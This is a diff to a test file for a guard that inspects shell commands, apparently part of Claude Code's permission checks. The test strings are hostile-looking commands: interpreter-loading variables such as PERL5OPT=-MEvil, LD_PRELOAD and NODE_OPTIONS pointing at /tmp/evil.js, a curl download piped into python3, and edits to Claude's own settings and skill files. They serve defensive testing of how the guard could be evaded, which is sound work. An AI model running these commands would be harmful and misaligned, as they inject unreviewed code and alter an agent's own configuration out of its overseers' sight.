@@ -159,7 +159,6 @@ describe('reading what a shell command writes', () => {
     expect(unseen('python3 <<EOF\nprint(1)\nEOF')).toEqual([])
     // A variable that makes the interpreter load code of its own, on the command or set before it, makes its code unseen.
     expect(unseen("PERL5OPT=-MEvil perl -pi -e 's/a/b/' x.md")).toEqual(['perl runs with PERL5OPT set, so it loads code the guard does not read'])
-    expect(writes("PERL5OPT=-MEvil perl -pi -e 's/a/b/' x.md")).toEqual([])
     expect(unseen("export RUBYOPT=-revil; ruby -pi -e 'gsub(/a/, %q(b))' x.md")).toEqual(['ruby runs with RUBYOPT set, so it loads code the guard does not read'])
     expect(unseen("PERL5LIB=/tmp/lib && perl -pi -e 's/a/b/' x.md")).toEqual(['perl runs with PERL5LIB set, so it loads code the guard does not read'])
     expect(unseen("env PYTHONPATH=/tmp python3 -c 'print(1)'")).toEqual(['python3 runs with PYTHONPATH set, so it loads code the guard does not read'])
@@ -179,6 +178,12 @@ describe('reading what a shell command writes', () => {
     expect(unseen(`export PERL5OPT=-MEvil; unset -f PERL5OPT; perl -e 'print 1'`)).toEqual(['perl runs with PERL5OPT set, so it loads code the guard does not read'])
     expect(unseen(`export PERL5OPT=-MEvil; env -u PERL5OPT perl -e 'print 1'; env -i perl -e 'print 2'; env --unset=PERL5OPT perl -e 'print 3'`)).toEqual([])
     expect(unseen(`export PERL5OPT=-MEvil; env -u OTHER perl -e 'print 1'`)).toEqual(['perl runs with PERL5OPT set, so it loads code the guard does not read'])
+    // PR review, round two: env itself starts with the library loaded before it clears anything; what a shell command is
+    // given reaches the commands inside it; and a file edited in place beside loaded code is still a file it changes.
+    expect(unseen('export LD_PRELOAD=/tmp/x.so; env -i /usr/bin/true')).toEqual(['env runs with LD_PRELOAD set, so it loads code the guard does not read'])
+    expect(unseen(`NODE_OPTIONS=--require=/tmp/evil.js sh -c 'node -e "console.log(1)"'`)).toEqual(['node runs with NODE_OPTIONS set, so it loads code the guard does not read'])
+    expect(unseen(`PERL5OPT=-MEvil env -S "perl -e 'print 1'"`)).toEqual(['perl runs with PERL5OPT set, so it loads code the guard does not read'])
+    expect(writes("PERL5OPT=-MEvil perl -pi -e 's/a/b/' settings.json")).toEqual([`unknown ${PROJECT}:settings.json: an edit perl makes, beside code PERL5OPT loads`])
     expect(unseen('curl -s https://example.com/x.py | python3 -')).toEqual(['python3 runs code from its input, which the guard does not read'])
     // A script file or module is judged by the paths it is given, not by where it lives.
     expect(writes('python3 ~/.claude/skills/pdf/scripts/fill.py in.pdf /tmp/out.pdf')).toEqual([`unknown ${PROJECT}:/tmp/out.pdf: what fill.py writes when given this path`])
@@ -313,12 +318,14 @@ describe('what a shell command changes where Claude Code loads from', () => {
       "PERL5OPT=-MEvil perl -pi -e 's/a/b/' ~/.claude/commands/expenses.md",
       "BASH_ENV=~/.claude/skills/old/SKILL.md bash -c 'echo ok'",
       'LD_PRELOAD=/tmp/x.so /usr/bin/true ~/.claude/settings.json',
+      // PR review, round two: a file named relative to the session's folder, which is Claude's own.
+      ["PERL5OPT=-MEvil perl -pi -e 's/a/b/' settings.json", `${HOME}/.claude`],
       // An edit beside a change elsewhere, a new command beside an edit, or a copy whose source cannot be read.
       "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md ~/.claude/settings.json",
       "sed -i '' 's/a/b/' ~/.claude/commands/expenses.md && echo x > ~/.claude/commands/new.md",
       'cp "$SRC" ~/.claude/commands/new.md',
-    ]) {
-      expect(await change(command)).toMatchObject(held)
+    ] as (string | [string, string])[]) {
+      expect(await (typeof command === 'string' ? change(command) : change(...command))).toMatchObject(held)
     }
   })
 
